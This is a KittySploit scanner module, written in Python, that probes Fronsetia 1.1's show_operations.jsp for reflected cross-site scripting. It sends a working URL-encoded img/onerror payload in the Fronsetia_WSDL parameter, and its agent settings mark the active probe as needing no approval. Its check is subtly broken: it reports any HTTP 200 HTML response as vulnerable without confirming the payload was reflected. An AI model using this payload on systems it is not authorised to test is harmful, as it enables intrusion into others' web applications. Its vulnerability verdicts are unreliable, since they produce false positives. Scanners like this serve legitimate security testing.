#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The fronsetiav1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fronsetiav1.1 - Cross-Site Scripting Detection',
        'description': "The fronsetiav1.1 application is vulnerable to a Reflected XSS attack through the show_operations.jsp endpoint. An attacker can inject malicious scripts via the WSDL Location input, which is executed in the victim's browser due to improper input sanitization. This allows attackers to execute arbitrary JavaScript, potentially stealing sensitive data or performing phishing attacks..",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'fronsetia', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2024/Nov/10',
            'https://packetstormsecurity.com/files/182764/fronsetia-1.1-Cross-Site-Scripting.html',
            'https://msecureltd.blogspot.com/2024/11/friday-fun-pentest-series-14-reflected.html',
        ],
    }

    def run(self):
        path = '/show_operations.jsp?Fronsetia_WSDL=%22%3E%3Cimg%2Bsrc%3Dx%20onerror%3Dalert(document.domain)%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('text/html',)
        if any(m in content_type for m in ctype_any):
            self.set_info(
                severity='high',
                reason='Fronsetiav1.1 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

